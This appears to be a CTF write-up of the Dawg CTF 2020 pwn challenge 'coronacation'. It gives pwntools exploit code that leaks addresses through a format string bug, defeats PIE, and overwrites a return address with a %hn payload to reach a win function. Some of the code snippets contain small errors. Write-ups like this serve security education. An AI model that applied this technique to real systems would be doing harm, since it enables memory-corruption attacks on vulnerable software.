---
layout: writeup
categories: [writeup]

# Mandatory parameters
title:  "coronacation"
author: "punshLineLama"
date:   2020-04-12 01:10:05 +0200
event: "Dawg CTF 2020"

# Optional parameters
ctf_categories: [pwn, format string]
image: "img/thumbnail.png"
---

## Description
The challenge was in the pwn category and gave 400 points.
A executable was provided.

## TL;DR
Use the first format string vulnerability to leak addresses, from which you can calculate the return address of the relevant return address.
Then overwrite that return address with the address of the win function with the second format string vulnerability.

## Information Gathering
### Check Security Measures
The provided binary is a 64 bit elf which is not stripped, which means that it contains the original function names such as *main* or *__libc_start_main*.
With the `checksec` command from pwntools, one can check the implemented security measures:
```bash
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```
We can see that the binary has no stack canary and has **PIE** enabled.
*PIE* stands for Position-Independent-Execution. This means that the elf is loaded into a random position in  the virtual memory, instead of a fixed address.

We also see that there is *no* stack canary. Thus a buffer overflow might be possible.

### Decompiling The Binary
The next step is to decompile the binary with ghidra to examine what is going on and determine possible security flaws.

After skimming through the code, two security critical functions can be identified, namely: *play_game* and *close_borders* (Note: *no_panic* also has a security flaw, but its basically the same as *close_borders* and only either is reached. Thus only *close_borders* is considered. If this side-note confuses you, you can just ignore it.).

When decompiling *play_game* is looks like this:
```C
void play_game(void)
{
  char user_input [64];

  puts("Welcome to this choose your own adventure game!");
  puts("You\'re President Ronald Drump and are tasked with leading the nation through this crisis.");
  puts("So what do you want to do?");
  puts("1. Close the borders.");
  puts("2. Tell everyone not to panic. It\'s just the Fake News media freaking out.");
  fgets(user_input,0x32,stdin);
  printf("You chose: ");
  //Here comes the format string vuln:
  printf(user_input);
  if (user_input[0] == '1') {
    close_borders();
  }
  else {
    if (user_input[0] == '2') {
      no_panic();
    }
  }
  return;
}
```

It can be seen, that its not possible to overflow the *user_input* buffer, as the *fgets* function only reads 0x32=50 bytes.

However, just before the first if statement is a format string vulnerability.
*printf* prints the user buffer without formatting it.
We can use this to leak values from the stack.



Now lets have a look at the *close_borders* function, which will get called after the *play_game* function, if the first provided character is *1* (which it will be according to our plan).

The decompiled *close_borders* functions look like this:

```C
void close_borders(void)

{
  char user_input [64];

  puts("\nSo we closed our borders. Weren\'t we doing that anyway with the wall?");
  puts("It\'s still spreading within our borders what do we do now?");
  puts(
      "1. Reassure everyone the country can handle this. Our healthcare system is the best. Justthe greatest."
      );
  puts("2. Make it a national emergency. Show the people we don\'t need Bernie\'s healthcare plan.")
  ;
  fgets(user_input,0x32,stdin);
  printf("You chose: ");
  printf(user_input);
  if (user_input[0] == '1') {
    lose3();
  }
  else {
    if (user_input[0] == '2') {
      lose4();
    }
  }
  return;
}
```

This function looks very similar to the previous function.
Its also not possible to overflow the user buffer, but there is also a format string vulnerability.
We will use it to overwrite the return address with the help of the addresses, which were leaked by the previous format string vulnerability.


## Exploitation
The first step is to leak some addresses from the stack, and check if we find some useful values.
```python
#attach debugger
adb.attach(p)
#recv text from binary until its expects user input
p.recvuntil("out.\n")
#send 1 (to enter the close_border function afterwards) follow by format strings %p to print pointers
p.sendline("1"+"%p."*14)
#receive leaked data
leak = p.recvuntil("\n")
#print leaked data
print("leak is: "+leak)
```

The leak looks something like this:
```
leak is:You chose: 10x736f686320756f59.(nil).(nil).0x7ffe2f894c70.0xb.0x252e70252e702531.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0xa2e7025.0x55f6d7821490.0x55f6d7821080.0x7ffe2f894cc0.
```
When running *vmmap* in the debugger, we note that the addresses beginning with 0x7ffe2f89???? are stack or libc addresses, whereas addresses starting the 0x55f6d7821??? are addresses from the .text section, meaning the actual code of the binary.

The leak provides us with a reference address of the stack, and a reference address of the .text section.
We will use both addresses to circumvent **PIE**.
With both reference addresses, and some offset, we can calculate the actual address of the win function, and an address of a *saved rip* register.

### Calculating Offsets

In the debugger, we print the address of the win function (`p win` in gdb), which is: `0x55f6d7821165`.
After setting a breakpoint in the *close_borders* function (`b close_borders` in gdb), we can examine where it return address is located (`info frame` or for short `i f` in gdb).
This gets us: `0x7ffe2f894c68`.

From there two values and two leaked values from the stack, we can calculate the offsets.

```python
leak = leak.split(".")
# offset_win = leak[-3] - win_addr <=> win_addr = leak[-3] - offset_win
offset_win = 0x55f6d7821080 - 0x55f6d7821165
#offset_ret = leak[-2] - ret_addr <=> ret_addr = leak[-2] - offset_ret
offset_ret = 0x7ffe2f894cc0 -0x7ffe2f894c68

ret_addr = p64(int(leak[-3], 16)-offset_ret)
win_addr =  p64(int(leak[-2], 16)-offset_win)

```

### Generating The Payload

The preparation is done. Now we need to overwrite the return address with the win address, easy right?
We just send the program something like: `ret_addr+"%"+str(first_byte)+"x%hn"+ret_addr+1+"%"+str(first_byte)+"x%hn"...`
Unfortunately not. The ret_address contains null bytes.
The *printf* function only prints until the first null byte.
Thus we need to put the ret_addr after the format string.
Furthermore, we can only do the *%n* once, as it needs an address to write to, and *ret_address* contains a null byte.

As the unaltered return address points somewhere in the code segment, we only need to alter the last two bytes to let it point to *win*.

```python
last_two_bytes = int("0x"+str(hex(int(leak[-2], 16)-offset_win))[-4:], 16)
#change the two last bytes of the return to point to the win function
len_last_two = len(str(last_two_bytes))
payload = "a"*(8-len_last_two)+"%"+str(last_two_bytes-(8-len_last_two))+"x%8$hn."+ret_addr
```

Lets have a closer look at the payload:
- The first part `"a"*(8-len_last_two)` is simply some padding, such that the *ret_address* will be aligned on the stack.

- The second part `"%"+str(last_two_bytes-(8-len_last_two))+"x"` writes *last_two_bytes* many characters to the stdout.

- The third part `%8$hn` writes the number of printed/written characters the 8th address on the stack. Which is in our case our *ret_addr* which is written to the stack in part four of the payload.

- The fourth part *ret_addr* is just the return address of the stack frame

*Note*: To find at which position the *ret_addr* is, you can replace `%i$hn` with `%i$lx`, if you find that the correct return address is printed, you can replace it back to `%i$hn`.

### Grabbing The Flag

After the *close_borders* function return, the win function should be executed and we can grab the flag.

```python
a = p.recvuntil("}")
	flag = re.findall(r"DawgCTF{.*}",a)
	if flag > 0:
		print("Flag is: "+flag[0])
	p.close()
```


Tadaa, and we get the flag!! :)
```
Flag is: DawgCTF{Example_Flag}
```

(Server are already down, so I can only show off with the local example flag :P )

The whole script and the binary and example flag are in the `src/` directory.


## Lessons learned
- Check if addresses have null bytes.
- Try to overwrite as few bytes as possible
- Use `%i$lx` to find the relevant address on the stack, then write by replacing it with `%i$hn`.
- always use a gdb plugin like *gef*, *peda* or *pwndbg*
